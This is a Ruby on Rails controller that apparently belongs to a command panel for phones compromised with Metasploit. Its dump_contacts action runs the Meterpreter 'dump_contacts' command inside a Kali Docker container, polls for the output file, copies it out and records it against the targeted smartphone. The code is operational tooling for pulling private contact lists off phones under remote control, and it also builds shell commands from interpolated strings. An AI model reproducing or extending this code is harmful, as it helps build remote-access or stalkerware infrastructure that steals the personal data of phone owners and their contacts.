class ContactsController < InheritedResources::Base
    def dump_contacts
        commandTimeout=20
        downloadTimeout=20
        @smartphone = Smartphone.find(params[:smartphone_id])

        currentTime = DateTime.now
        currentTimeFormat=currentTime.strftime("%Y-%m-%d_%H--%M--%S")
        @fileName= "contacts_dump_" + currentTimeFormat + '.txt'
        processCommand="dump_contacts -f text -o #{@fileName}"
        commandOutput=start_msf_process(processCommand)
        puts commandOutput

        1.upto(commandTimeout) do |n|
            if system("docker exec kali_container sh -c \"ls | grep #{@fileName}\"")
                break
            else
                puts "Waiting ..."
            end
            sleep 1
          end
        copyContactsCommand="docker cp kali_container:/#{@fileName} app\\assets\\images\\files\\contacts_dumps\\#{@fileName}"
        system(copyContactsCommand)

        fullPath="app\\assets\\images\\files\\contacts_dumps\\" + @fileName
        isOperationSuccessful=false
        1.upto(downloadTimeout) do |n|
            if File.file?(fullPath)
                newContactsDump=Contact.new(:date => currentTimeFormat.gsub('_',' ').gsub('--',':'),:filename => @fileName, :smartphone_id => @smartphone.id)
                newContactsDump.save!
                isOperationSuccessful = true
                break
            end 
        end
        commandOutput=["Operation Failed"] if not isOperationSuccessful

        respond_to do |format|
            format.js { render "dump_contacts", :locals => {:commandOutput => commandOutput, :fileName => @fileName}  }
          end
    end



  private

    def contact_params
      params.require(:contact).permit(:date, :filename, :smartphone_id)
    end

end
